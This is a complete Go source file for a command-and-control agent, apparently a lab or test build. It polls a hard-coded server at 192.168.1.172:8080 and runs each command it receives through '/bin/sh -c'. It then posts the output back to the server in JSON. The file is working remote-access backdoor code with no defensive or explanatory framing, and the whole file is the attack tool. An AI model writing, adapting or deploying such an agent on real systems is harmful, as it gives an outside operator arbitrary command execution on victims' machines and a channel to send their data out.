package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os/exec"
	"time"
)

const (
	ServerURL = "http://192.168.1.172:8080" 
	AgentID   = "agent-linux-test"
	PollDelay = 2 * time.Second
)

type PollResponse struct {
	Status  string `json:"status"`
	Command string `json:"command"`
}

type OutputPayload struct {
	ID     string `json:"id"`
	Output string `json:"output"`
}

func main() {
	fmt.Printf("[*] Starting agent %s...\n", AgentID)
	fmt.Printf("[*] Polling server at %s every %v\n", ServerURL, PollDelay)

	for {
		// poll to server ep
		pollURL := fmt.Sprintf("%s/api/agent/poll?id=%s", ServerURL, AgentID)
		resp, err := http.Get(pollURL)
		if err != nil {
			fmt.Printf("[-] Error connecting to server: %v\n", err)
			time.Sleep(PollDelay)
			continue
		}

		body, err := io.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			fmt.Printf("[-] Error reading response: %v\n", err)
			time.Sleep(PollDelay)
			continue
		}

		var pollResp PollResponse
		if err := json.Unmarshal(body, &pollResp); err != nil {
			fmt.Printf("[-] Error parsing JSON: %v\n", err)
			time.Sleep(PollDelay)
			continue
		}

		//exec assinged task
		if pollResp.Status == "task_assigned" && pollResp.Command != "" {
			fmt.Printf("[+] Received command: %s\n", pollResp.Command)

			//exec comand 
			cmd := exec.Command("/bin/sh", "-c", pollResp.Command)
			var out bytes.Buffer
			cmd.Stdout = &out
			cmd.Stderr = &out

			err := cmd.Run()
			outputStr := out.String()
			if err != nil {
				outputStr += fmt.Sprintf("\n[-] Execution error: %v", err)
			}

			//no output
			if outputStr == "" {
				outputStr = "[+] Command executed successfully (no output)."
			}

			//send output to server
			sendOutput(AgentID, outputStr)
		}

		//poll delay
		time.Sleep(PollDelay)
	}
}

func sendOutput(agentID string, output string) {
	outputURL := fmt.Sprintf("%s/api/agent/output", ServerURL)
	payload := OutputPayload{
		ID:     agentID,
		Output: output,
	}

	jsonData, err := json.Marshal(payload)
	if err != nil {
		fmt.Printf("[-] Error marshalling payload: %v\n", err)
		return
	}

	resp, err := http.Post(outputURL, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		fmt.Printf("[-] Error sending output: %v\n", err)
		return
	}
	defer resp.Body.Close()

	fmt.Println("[+] Output sent back to server successfully.")
}
